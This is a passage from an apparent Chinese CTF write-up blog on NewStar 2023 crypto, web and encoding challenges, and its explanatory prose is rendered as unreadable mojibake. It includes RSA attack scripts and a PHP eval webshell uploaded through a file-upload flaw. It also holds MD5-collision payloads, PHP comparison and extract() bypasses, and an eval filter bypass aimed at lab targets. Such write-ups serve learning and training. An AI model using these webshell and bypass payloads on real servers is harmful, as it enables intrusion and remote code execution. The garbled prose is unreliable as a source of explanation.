307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635p=gmpy2.gcd(pow(2,e*dp,n)-2,n)print(p)for i in range(1, e):    p = (dp * e - 1) // i + 1    if n % p == 0:        q = n // p        print(q)        breakprint(q)phi_n = (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)m = pow(c, d, n)print(m)flag = libnum.n2s(int(m))print(flag)\n\n\nflag&#123;cd5ff82d-989c-4fbf-9543-3f98ab567546&#125;\nä¸æ­¢ä¸€ä¸ªpi\nåŒæ ·æ ¹æ®é¢˜ç›®å’Œç»™å‡ºçš„pythonä»£ç ï¼ŒçŒœæµ‹ä»ç„¶æ˜¯RSAä¸­çš„ eå’Œphiä¸äº’ç´ ï¼Œå³æ˜¯ å­˜åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªæ¨¡æ•°ä¸”gcd(N1,N2)!=1\n\n\nimport gmpy2import libnump = 171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217q = 115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713e = 65537c = 4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337n = p * qphi = (p - 1) * (q - 1)t = gmpy2.gcd(e, phi)t1 = e // tdt1 = gmpy2.invert(t1, phi)mt1 = pow(c, dt1, n)print(mt1)s, m = gmpy2.iroot(mt1, t)print(s)print(libnum.n2s(int(s)))\n\n\nflag&#123;bu_zhi_yige_p1dsaf&#125;\nhalfcandecodeout.txtï¼š\n113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969430547662355311113725288593525679959779486251573406737956190751381836839290019861008338662276880815638038629779366808224079248973574912013564134936455159624588545707311761930552597795640519912770929413793927000651502869366077840737074486301504058980830001571749277332601983556906206394870495233453803649486494a8a08f09d37b73795649038408b5f3303c7c0ace395d80182db07ae2c30f034e1671797c52e15f763380b45e841ec32b14a7b8059d9c055954c92674ce60032e358efa489f58062f10dd7316b65649ecfcd208495d565ef66e7dff9f98764dab14a7b8059d9c055954c92674ce600328fa14cdd754f91cc6554c9e71929cce70cc175b9c0f1b6a831c399e2697726614a8a08f09d37b73795649038408b5f33e358efa489f58062f10dd7316b65649ecfcd208495d565ef66e7dff9f98764da4b43b0aee35624cd95b910189b3dc231cbb184dd8e05c9709e5dcaedaa0495cf\n\ntask.py\nfrom Crypto.Util.number import *import gmpy2from flag import flagimport osfrom hashlib import md5def gen_prime(number):    p = getPrime(number // 2)    q = gmpy2.next_prime(p)    return p * qdef md5_hash(m):    return md5(m.encode()).hexdigest()e = 65537n = gen_prime(1024)m1 = bytes_to_long(flag[:len(flag) // 2].encode() + os.urandom(8))c1 = pow(m1, e, n)m2 = flag[len(flag) // 2:]with open(&quot;out.txt&quot;,&quot;w&quot;) as f:    f.write(str(n) + &#x27;\\n&#x27;)    f.write(str(c1) + &#x27;\\n&#x27;)    for t in m2:        f.write(str(md5_hash(t))+&#x27;\\n&#x27;)\n\né¦–å…ˆåˆ¤æ–­æ˜¯RSA çš„åŠ å¯†ï¼Œæ ¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½flagç”±ä¸¤ç«¯æ„æˆ\né¦–å…ˆå¤§ç´ æ•°åˆ†è§£,RSAè§£å¯†ï¼š\nimport gmpy2from Crypto.Util.number import *# å…¬é’¥ee = 65537# æ¬§æ‹‰å‡½æ•°eular euler = (p - 1) * (q - 1)p = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993409q = 10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993841eular = (p - 1) * (q - 1)n = 113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969c = 43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649# ç§é’¥dd = gmpy2.invert(e, eular)m = pow(c, d, n)print(long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))# print(long_to_bytes(m).decode(&#x27;latin-1&#x27;, errors=&#x27;ignore&#x27;))# print(long_to_bytes(m).decode(&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;))\n\nå¾—åˆ°å‰åŠæ®µflagï¼šflag&#123;two_cloab\næ¥ç€md5è§£å¯†ï¼ŒååŠæ®µï¼šcse_t0_fact0r&#125;\npartial decrypté¢˜ç›®ï¼š\nfrom secret import flagfrom Crypto.Util.number import *m = bytes_to_long(flag)e = 65537p = getPrime(512)q = getPrime(512)n = p*q c = pow(m,e,n)dp = inverse(e, (p-1))dq = inverse(e, (q-1))m1 = pow(c,dp, p)m2 = pow(c,dq, q)q_inv = inverse(q, p)h = (q_inv*(m1-m2)) % pprint(&#x27;m2 =&#x27;, m2)print(&#x27;h =&#x27;, h)print(&#x27;q =&#x27;, q)# m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884# h = 4180720137090447835816240697100630525624574275# q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931\n\nè¿™æ˜¯å…³äºRSA-CRT(ä¸­å›½å‰©ä½™å®šç†)\nfrom Crypto.Util.number import *m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884h = 4180720137090447835816240697100630525624574275q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931m = m2+h*qprint(long_to_bytes(m))\n\n\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"NewStar 2023 Week1","url":"/NewStar-2023/","content":"NewStar WriteUp Week1webæ³„éœ²çš„ç§˜å¯†\nçœ‹åˆ°é¢˜ç›® é¦–å…ˆæƒ³åˆ° ä¿¡æ¯æ³„éœ²ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼šæƒ³åˆ° phpinfo.php test.php â€¦. \nâ€‹\t\t\tæœ€ååˆ°robots.txt å¾—åˆ°ä¸€åŠflagï¼š\n\nPART ONE: flag&#123;r0bots_1s_s0_us3ful\nwww.zip: \n\n$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;;\n&lt;?php$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;;echo &quot;&lt;h1&gt;ç²—å¿ƒçš„ç®¡ç†å‘˜æ³„æ¼äº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œè¯·ä½ æ‰¾å‡ºä»–æ³„æ¼çš„ä¸¤ä¸ªæ•æ„Ÿä¿¡æ¯ï¼&lt;/h1&gt;&quot;;\n\nBegin of Upload\nå…¸å‹çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ ç®€å•çš„å°è¯•ä¸€ä¸‹ï¼š\nåˆ©ç”¨bpæŠ“åŒ… ä¿®æ”¹åç¼€ä»¥åŠæ·»åŠ ä¸€å¥è¯phpåé—¨ä»£ç ï¼š &lt;?php @eval($_POST[&#39;111111&#39;]);?&gt;\n\nä¸Šä¼ æˆåŠŸ åˆ©ç”¨èšå‰‘è¿æ¥\n\nå‘ç°flagflag&#123;ba65aadc-84ca-4ece-9a14-fadf4362f3c3&#125;\nErrorFlaskæ‰“å¼€é¶æœºæ˜¾ç¤ºï¼š\n\nå…ˆåˆ©ç”¨æŠ“åŒ… ç®€å•æ„é€ number1å’Œnumber2ï¼š\n\nä¸æ˜¯sstiæ¨¡ç‰ˆæ³¨å…¥ï¼Œæƒ³åˆ°æ˜¯æ•´å‹æ•°å­—å¯ä»¥æ­£å¸¸å¾—å‡ºç»“æœï¼Œå‡å¦‚æ˜¯å­—ç¬¦ä¼šå¾—å‡ºä»€ä¹ˆï¼š\n\né¡µé¢500 æœç´¢flag å¾—åˆ°flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;\nBegin of HTTP\né¦–å…ˆæ‰“å¼€ç›®æ ‡é¶æœº\n\n\nå‘ç°å¯èƒ½é¦–å…ˆæ¶‰åŠçš„æ˜¯getæ–¹å¼ä¼ å‚æ•° ctfï¼Œåˆ©ç”¨æŠ“åŒ…çœ‹çœ‹æ•ˆæœ\n\n\né¡µé¢ç»™å‡ºæç¤º ï¼Œåç»­éœ€è¦åˆ©ç”¨POSTè¯·æ±‚ç»™secretä¼ å€¼ï¼Œä½†æ˜¯å…·ä½“ä¼ ä»€ä¹ˆè¿˜ä¸çŸ¥é“ï¼Œé¦–å…ˆæŸ¥çœ‹æºä»£ç \n\n\nå‘ç°äº†å°ä¸œè¥¿ï¼š&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; åˆ©ç”¨base64è§£å¯†å¾—åˆ°ï¼šn3wst4rCTF2023g00000d\n\n\nè¿›è¡Œpostä¼ å€¼secret=n3wst4rCTF2023g00000d\n\n\næˆåŠŸä¼ å€¼åç»™å‡ºä¸‹ä¸€æ­¥æç¤ºï¼šå‘ç°cookieä¸­å­˜åœ¨power äºæ˜¯å°†powerä¿®æ”¹ä¸ºctfer\n\n\nä¸‹ä¸€æ­¥æç¤ºéœ€è¦ä¿®æ”¹æµè§ˆå™¨ï¼Œå³æ˜¯ä¿®æ”¹UA  User-Agent: NewStarCTF2023\n\n\nç»§ç»­è·Ÿç€æç¤ºä¿®æ”¹Referer: newstarctf.com \n\n\næœ¬æ¥ä»¥ä¸ºç»“æŸäº†ï¼Œæ—¢ç„¶è¿˜æœ‰ï¼Œé™åˆ¶åªå…è®¸æœ¬åœ°ç”¨æˆ·ï¼Œé¦–å…ˆæƒ³åˆ°X-Forwarded-Forï¼Œä½†æ˜¯å°è¯•äº†X-Forwarded-For:127.0.0.1æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œç»§ç»­æŸ¥é˜…ç›¸å…³httpçš„èµ„æ–™å‘ç° x-real-ipä¹Ÿèƒ½é™åˆ¶æœ¬åœ°ç”¨æˆ·\n\n\nå¾—åˆ°flagï¼šflag&#123;17b2edf3-a19b-4e8f-8639-cb2c5edb7000&#125;\n\n\næ•´ä¸ªé¢˜çš„æ€è·¯è¿˜æ˜¯å¾ˆç®€å•ï¼Œåªéœ€è¦è·Ÿç€é¢˜ç›®çš„æç¤ºæ¥è§£å†³å°±è¡Œï¼Œä¸»è¦æ˜¯è¦äº†è§£httpçš„ç›¸å…³çŸ¥è¯†ã€‚\nBegin of PHP\né¦–å…ˆæ‰“å¼€é¶æœºçœ‹åˆ°phpä»£ç ï¼š\n &lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123;    echo &quot;=Level 1=&lt;br&gt;&quot;;    if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123;        $flag1 = True;    &#125;else&#123;        die(&quot;nope,this is level 1&quot;);    &#125;&#125;if($flag1)&#123;    echo &quot;=Level 2=&lt;br&gt;&quot;;    if(isset($_POST[&#x27;key3&#x27;]))&#123;        if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123;            $flag2 = True;        &#125;    &#125;else&#123;        die(&quot;nope,this is level 2&quot;);    &#125;&#125;if($flag2)&#123;    echo &quot;=Level 3=&lt;br&gt;&quot;;    if(isset($_GET[&#x27;key4&#x27;]))&#123;        if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123;            $flag3 = True;        &#125;else&#123;            die(&quot;nope,this is level 3&quot;);        &#125;    &#125;&#125;if($flag3)&#123;    echo &quot;=Level 4=&lt;br&gt;&quot;;    if(isset($_GET[&#x27;key5&#x27;]))&#123;        if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123;            $flag4 = True;        &#125;else&#123;            die(&quot;nope,this is level 4&quot;);        &#125;    &#125;&#125;if($flag4)&#123;    echo &quot;=Level 5=&lt;br&gt;&quot;;    extract($_POST);    foreach($_POST as $var)&#123;        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;            die(&quot;nope,this is level 5&quot;);        &#125;    &#125;    if($flag5)&#123;        echo file_get_contents(&quot;/flag&quot;);    &#125;else&#123;        die(&quot;nope,this is level 5&quot;);    &#125;&#125; \n\n\n\nè¿›è¡Œä»£ç å®¡è®¡ï¼Œå‘ç°å¤§æ¦‚æ€è·¯æ˜¯é¦–å…ˆè¾“å…¥key1å’Œkey2æ»¡è¶³ä¸¤ä¸ªè¾“å…¥çš„å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒå¾—åˆ°flag1 æ¥ç€æ»¡è¶³å…¶ä»–æ¡ä»¶ä¾æ¬¡å¾—åˆ°flag2ï¼Œflag3ï¼Œflag4ï¼Œç”±flag5å¾—åˆ°flag\n\né¦–å…ˆæ‰¾åˆ°key1å’Œkey2æ»¡è¶³ä¸¤ä¸ªè¾“å…¥çš„å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒ\nkey1= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9Bkey2= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B\n\n\n\næ ¹æ®æç¤ºå·²ç»è¿›å…¥level 2 æ­¤æ—¶è¦æ»¡è¶³md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]\nåƒè¿™æ ·çš„å¼ºæ¯”è¾ƒï¼Œä¼ å…¥çš„ä¸æ˜¯å­—ç¬¦ä¸²è€Œæ˜¯æ•°ç»„ï¼Œä¸ä½†md5() å’Œ sha1()å‡½æ•°ä¸ä¼šæŠ¥é”™ï¼Œç»“æœè¿˜ä¼šè¿”å›nullï¼Œåœ¨å¼ºæ¯”è¾ƒé‡Œé¢null&#x3D;nullä¸ºtrueç»•è¿‡\n\n\næ­¤æ—¶å·²ç»æ˜¾ç¤ºè¿›å…¥level 3 ï¼Œæ¥ç€æ»¡è¶³strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)\nstrcmp çš„å‚æ•°åªèƒ½æ˜¯ å­—ç¬¦ä¸²ï¼Œå½“æˆ‘ä»¬ä¼ å…¥æ•°ç»„æ—¶å°±ä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨çš„æ˜¯&#x3D;&#x3D;ï¼ŒNULL&#x3D;&#x3D;0æ˜¯ bool(true)çš„\n\n\nç°åœ¨è¿›å…¥level 4ï¼Œç°åœ¨éœ€è¦æ»¡è¶³!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023\n\n\næœ€ååˆ°è¾¾level 5ï¼Œæ ¹æ®\nextract($_POST);   foreach($_POST as $var)&#123;       if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;           die(&quot;nope,this is level 5&quot;);       &#125;   &#125;   if($flag5)&#123;       echo file_get_contents(&quot;/flag&quot;);   &#125;\n\né¦–å…ˆè¦è¿‡æ»¤preg_matchï¼Œæ¥ç€è¦æ„é€ flag5\nå»ºè®®ï¼šå½“åˆä¸æ˜¯å¾ˆæ˜ç™½ï¼Œåˆ©ç”¨phpstudyæ„é€ æ­¤é¡µé¢è¿›è¡Œæµ‹è¯•\nif($flag4)&#123;    echo &quot;=Level 5=&lt;br&gt;&quot;;    extract($_POST);    print_r($_POST);    foreach($_POST as $var)&#123;        print_r($var);        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;            die(&quot;nope,this is level 5-1&quot;);        &#125;    &#125;    if($flag5)&#123;        echo &quot;hello&quot;;        echo file_get_contents(&quot;/flag&quot;);    &#125;else&#123;        die(&quot;nope,this is level 5-2&quot;);    &#125;&#125; \n\n\nç»•è¿‡preg_match,é€šè¿‡%00``%5cç»•è¿‡\n\n\næœ€åå¾—åˆ°flagï¼šflag&#123;de665d4c-3bbd-44e8-8eba-2b6cfeef881a&#125;\n\n\nR!C!E!\n\né¦–å…ˆè§‚å¯Ÿç»™å‡ºçš„phpä»£ç ï¼š\n &lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123;    $password=md5($_POST[&#x27;password&#x27;]);    $code=$_POST[&#x27;e_v.a.l&#x27;];    if(substr($password,0,6)===&quot;c4d038&quot;)&#123;        if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123;            eval($code);        &#125;    &#125;&#125; \n\nå®¡æŸ¥ä»£ç å¾—çŸ¥ï¼šéœ€è¦é€šè¿‡POSTä¼ å‚passwordå’Œe_v.a.l \nmd5ç¢°æ’å¾—åˆ°ï¼š114514çš„md5å€¼å‰6ä¸ºæ˜¯c4d038\n\næ¶‰åŠåˆ°RCEç»•è¿‡ï¼šé€šé…ç¬¦ç»•è¿‡ï¼Œå†…æ•›æ‰§è¡Œ\n\n\n\ncryptobrainfuck++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.\nbrainfuckåœ¨çº¿è§£å¯†ï¼š\n\nflag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;\nCaesarâ€™s Secertkqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;\nå‡¯æ’’å¯†ç è§£å¯†ï¼š\n\nFencefa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3\næ …æ å¯†ç è§£å¯†ï¼š\n\nflag&#123;reordering_the_plaintext#686f8c03&#125;\nbabyrsaRSAç®—æ³•\nRSAç®—æ³•ç”±ä¸¤ä¸ªå¯†é’¥ï¼Œå³å…¬é’¥å’Œç§é’¥ç»„æˆã€‚â€‚â€‚â€‚â€‚1ï¼‰å‡†å¤‡ä¸¤ä¸ªéå¸¸å¤§çš„ç´ æ•° på’Œ q ï¼ˆè½¬æ¢æˆäºŒè¿›åˆ¶å 1024ä¸ªäºŒè¿›åˆ¶ä½æˆ–è€…æ›´å¤šï¼Œä½æ•°è¶Šå¤šè¶Šéš¾ç ´è§£ï¼‰ï¼›â€‚â€‚â€‚â€‚2ï¼‰åˆ©ç”¨å­—ç¬¦ä¸²æ¨¡æ‹Ÿè®¡ç®—å¤§ç´ æ•° p å’Œ q çš„ä¹˜ç§¯ m&#x3D;pqï¼›â€‚â€‚â€‚â€‚3ï¼‰åŒæ ·æ–¹æ³•è®¡ç®—m&#x3D;(p-1)(q-1) ï¼Œè¿™é‡Œçš„ mæ˜¯ n çš„æ¬§æ‹‰å‡½æ•°ï¼›â€‚â€‚â€‚â€‚4ï¼‰æ‰¾åˆ°ä¸€ä¸ªæ•°e (1&lt;e&lt;m)æ»¡è¶³ gcd(m,e)&#x3D;1ï¼ˆå³ e å’Œ m äº’ç´ ï¼‰ï¼›â€‚â€‚â€‚â€‚5ï¼‰è®¡ç®— e åœ¨æ¨¡ m åŸŸä¸Šçš„é€†å…ƒd ï¼ˆå³æ»¡è¶³ed mod m &#x3D;1 ï¼‰ï¼›â€‚â€‚â€‚â€‚6ï¼‰è‡³æ­¤ï¼Œå…¬é’¥å’Œç§é’¥ç”Ÿæˆå®Œæ¯•ï¼š (n,e)ä¸ºå…¬é’¥ï¼Œ (n,d)ä¸ºç§é’¥ï¼›\n\nåŠ å¯†ï¼šâ€‚å¯¹äºæ˜æ–‡xï¼Œç”¨å…¬é’¥ (n,e)å¯¹ x åŠ å¯†çš„è¿‡ç¨‹ï¼Œå°±æ˜¯å°† x è½¬æ¢æˆæ•°å­—ï¼ˆå­—ç¬¦ä¸²çš„è¯å–å…¶ ASCIIç æˆ–è€… unicode å€¼ï¼‰ï¼Œç„¶åé€šè¿‡å¹‚å–æ¨¡è®¡ç®—å‡ºy ï¼Œå…¶ä¸­ yå°±æ˜¯å¯†æ–‡ï¼›\n\nè§£å¯†ï¼šå¯¹äºå¯†æ–‡y ï¼Œç”¨ç§é’¥ (n,d) å¯¹ y è¿›è¡Œè§£å¯†çš„è¿‡ç¨‹å’ŒåŠ å¯†ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯è®¡ç®—å¹‚å–æ¨¡ï¼›\n\n\nfrom Crypto.Util.number import *from flag import flagdef gen_prime(n):    res = 1    for i in range(15):        res *= getPrime(n)    return resif __name__ == &#x27;__main__&#x27;:    n = gen_prime(32)    e = 65537    m = bytes_to_long(flag)    c = pow(m,e,n)    print(n)    print(c)# 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261# 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595\n\nç»è¿‡å¤§ç´ æ•°åˆ†è§£ï¼š17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261\nèƒ½åˆ†è§£æˆï¼š\n2217990919&lt;10&gt; 2338725373&lt;10&gt; 2370292207&lt;10&gt; 2463878387&lt;10&gt; 2706073949&lt;10&gt; 2794985117&lt;10&gt; 2804303069&lt;10&gt; 2923072267&lt;10&gt; 2970591037&lt;10&gt; 3207148519&lt;10&gt; 3654864131&lt;10&gt; 3831680819&lt;10&gt; 3939901243&lt;10&gt; 4093178561&lt;10&gt; 4278428893&lt;10&gt;\n\næ ¹æ®ç»™å‡ºçš„æ–‡ä»¶ å†™å‡ºè§£ç è„šæœ¬ï¼š\nimport gmpy2from Crypto.Util.number import *# å…¬é’¥ee = 65537# æ¬§æ‹‰å‡½æ•°eular euler = (p - 1) * (q - 1)num = [2217990919, 2338725373, 2370292207, 2463878387,2706073949, 2794985117, 2804303069, 2923072267,       2970591037, 3207148519, 3654864131, 3831680819,3939901243, 4093178561, 4278428893]eular = 1for i in num:    eular = eular * (i - 1)# print(eular)n = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595# ç§é’¥dd = gmpy2.invert(e, eular)m = pow(c, d, n)print(long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))\n\nbabyencodingpart 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`\n\nçœ‹åˆ°é¢˜ç›® å¾—çŸ¥ï¼šflagç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ \n\npart 1 of flagï¼šbase64  flag{dazzling_encoding#4e0ad4\n\npart 2 of flag:base32   f0ca08d1e1d0f10c0c7afe422fea7\n\npart 3 of flag: UUencode  c55192c992036ef623372601ff3a}\n\n\n\nflag: flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a}\n\n\nUUencodeâ€‹\tç®€è¿°ï¼š\nâ€‹\tUUencodeæ˜¯ä¸€ç§äºŒè¿›åˆ¶åˆ°æ–‡å­—çš„ç¼–ç ï¼Œæœ€æ—©åœ¨unixé‚®ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œå…¨ç§°ï¼šUnix-to-Unix  encodingï¼ŒUUencodeå°†è¾“å…¥æ–‡æœ¬ä»¥æ¯ä¸‰ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ï¼Œå¦‚æœæœ€åå‰©ä¸‹çš„èµ„æ–™å°‘äºä¸‰ä¸ªå­—èŠ‚ï¼Œä¸å¤Ÿçš„éƒ¨ä»½ç”¨é›¶è¡¥é½ã€‚ä¸‰ä¸ªå­—èŠ‚å…±æœ‰24ä¸ªBitï¼Œä»¥6-bitä¸ºå•ä½åˆ†ä¸º4ä¸ªç»„ï¼Œæ¯ä¸ªç»„ä»¥åè¿›åˆ¶æ¥è¡¨ç¤ºæ‰€å‡ºç°çš„å­—èŠ‚çš„æ•°å€¼ã€‚è¿™ä¸ªæ•°å€¼åªä¼šè½åœ¨0åˆ°63ä¹‹é—´ã€‚ç„¶åå°†æ¯ä¸ªæ•°åŠ ä¸Š32ï¼Œæ‰€äº§ç”Ÿçš„ç»“æœåˆšå¥½è½åœ¨ASCIIå­—ç¬¦é›†ä¸­å¯æ‰“å°å­—ç¬¦ï¼ˆ32-ç©ºç™½â€¦95-åº•çº¿ï¼‰çš„èŒƒå›´ä¹‹ä¸­ã€‚\nâ€‹\tä¸¾ä¾‹ï¼š\næ˜æ–‡ï¼šhello,world.å¯†æ–‡ï¼š,:&amp;5L;&amp;\\L=V]R;&amp;0N\n\nâ€‹\tåœ¨çº¿è§£å¯†&amp;å·¥å…·ï¼š\nhttp://www.hiencode.com/uu.html\nbabyxoré¢˜ç›®ï¼š\nfrom secret import *ciphertext = []flag = &#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;for f in flag:    ciphertext.append(f ^ key)print(bytes(ciphertext).hex())# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2\n\nè§£å¯†è„šæœ¬\nfrom pwn import xorciphertext = 